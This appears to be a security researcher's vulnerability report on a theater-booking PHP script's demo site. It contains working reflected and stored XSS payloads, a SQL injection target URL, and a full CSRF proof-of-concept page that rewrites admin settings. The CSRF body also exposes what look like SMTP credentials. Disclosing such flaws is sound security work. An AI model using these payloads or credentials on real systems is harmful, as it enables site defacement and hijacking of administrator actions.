### Single Theater Booking- the lastest version - SQL Injection/XSS/CSRF

#### ADLab of Venustech

Well,  when I pentest the official demo site of Single Theater Booking, I found some vulnerabilities here.


#### XSS:

##### Reflect-XSS

```
http://www.theaterbookingscript.com/demo/theater-booking/single-theater/admin/viewtheatre.php?theatreid=29%27%22%3Etest%3Cimg%20src=x%20onerror=console.log(%27xss2%27)%3Etest%3C%27%22test
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Single-Theater-Booking/xss1.png)


##### Stored-XSS 

```
http://www.theaterbookingscript.com/demo/theater-booking/single-theater/admin/sitesettings.php
```

POST parameters:

```
------WebKitFormBoundaryw7uoyadfrLjLSWLe
Content-Disposition: form-data; name="title"

Ticket Booking'"><svg/onload=alert('xss')><'"
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Single-Theater-Booking/xss2.png)


#### SQL Injection:

##### sqli
```
http://www.theaterbookingscript.com/demo/theater-booking/single-theater/admin/movieview.php?movieid=56
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Single-Theater-Booking/sqli.png)


You can see,  we can obtain the current data user or more sensitive data now!


#### CSRF

We can use csrf attack to cheat the user to change sensitive settings in the user panel, even add stored-xss content into it.

poc:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/www.theaterbookingscript.com\/demo\/theater-booking\/single-theater\/admin\/sitesettings.php", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryw7uoyadfrLjLSWLe");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"websitename\"\r\n" + 
          "\r\n" + 
          "Ticket Booking \r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"title\"\r\n" + 
          "\r\n" + 
          "Ticket Booking\'\"\x3e\x3csvg/onload=alert(\'xss\')\x3e\x3c\'\"\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"admin_mailid\"\r\n" + 
          "\r\n" + 
          "info@phpscriptsmall.com\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"keyword\"\r\n" + 
          "\r\n" + 
          "Ticket Booking\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"description\"\r\n" + 
          "\r\n" + 
          "Good\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"websiteurl\"\r\n" + 
          "\r\n" + 
          "http://www.theaterbookingscript.com/demo/theater-booking/single-theater/\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"smtpserver\"\r\n" + 
          "\r\n" + 
          "mail.subamangla.in\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"smtpuser\"\r\n" + 
          "\r\n" + 
          "info@subamangla.in\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"smtppass\"\r\n" + 
          "\r\n" + 
          "subamangla\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"paypal\"\r\n" + 
          "\r\n" + 
          "raja.inetsolution@gmail.com\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"commision\"\r\n" + 
          "\r\n" + 
          "10\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"cutoff\"\r\n" + 
          "\r\n" + 
          "10\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"logo\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"oldlogo\"\r\n" + 
          "\r\n" + 
          "146598893614322806471390649927ticket1.png\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "Submit\r\n" + 
          "------WebKitFormBoundaryw7uoyadfrLjLSWLe--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>


```

This vulnerability does not need evil attacker to login into the admin or the user panel.

